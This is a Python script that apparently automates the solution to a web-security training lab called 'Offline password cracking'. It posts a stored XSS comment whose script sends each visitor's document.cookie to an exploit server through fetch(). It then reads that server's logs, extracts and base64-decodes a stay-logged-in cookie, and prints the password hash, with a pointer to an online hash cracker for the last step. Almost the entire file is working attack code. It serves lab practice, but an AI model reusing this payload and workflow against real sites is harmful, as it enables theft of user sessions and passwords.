import requests
import base64
import re
import time
from colorama import Fore

LAB_NAME = "Offline password cracking"

SCRIPT_START_TIME = time.time()

def print_progress(step, msg, status="..."):
    print(Fore.WHITE + f"[{step}] {msg} " + Fore.YELLOW + status, end="", flush=True)

def run(url, payload, proxies=None):
    lab_url = url.rstrip("/")
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Post a comment with a malicious XSS payload\n2. Fetch the exploit sever logs\n3. Extract the encoded cookie from logs\n4. Decode the encoded cookie\n5. Crack this hash using any online hash cracker\n""")

    exploit_url = input("[?] Enter the exploit server URL: ").strip()

    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    # Step 1: Post malicious comment
    print_progress(1, "Posting malicious XSS payload")
    try:
        data = {
            "postId": "2",
            "comment": f"<script>fetch('{exploit_url}/exploit?cookie=' + document.cookie)</script>",
            "name": "hacker",
            "email": "x@x.com",
            "website": ""
        }
        session.post(f"{lab_url}/post/comment", data=data, allow_redirects=False)
        print(Fore.GREEN + "OK")
    except Exception as e:
        print(Fore.RED + f"\n[!] Failed to post XSS payload: {e}")
        return False

    # Step 2: Fetch logs
    print_progress(2, "Fetching exploit server logs")
    try:
        logs = session.get(f"{exploit_url}/log", allow_redirects=False)
        print(Fore.GREEN + "OK")
    except Exception as e:
        print(Fore.RED + f"\n[!] Failed to fetch logs: {e}")
        return False

    # Step 3: Extract cookie
    print_progress(3, "Extracting encoded cookie from logs")
    match = re.search(r"stay-logged-in=([a-zA-Z0-9=]+)", logs.text)
    if not match:
        print(Fore.RED + "\n[!] No stay-logged-in cookie found in logs")
        return False

    encoded_cookie = match.group(1)
    print(Fore.GREEN + "OK")

    # Step 4: Decode cookie
    print_progress(4, "Decoding encoded cookie")
    try:
        decoded = base64.b64decode(encoded_cookie).decode()
        password_hash = decoded.split(":")[1]
        print(Fore.GREEN + "OK")
    except Exception as e:
        print(Fore.RED + f"\n[!] Failed to decode cookie: {e}")
        return False

    # Step 5: Final output
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(f"\n\n🗹 {Fore.WHITE}Password hash: {Fore.GREEN}{password_hash}")
    print(f"{Fore.WHITE}🗹 Use online hash cracker to crack the password (e.g., CrackStation)")
    print(f"{Fore.WHITE}🗹 Finished in {elapsed} seconds")
    return True
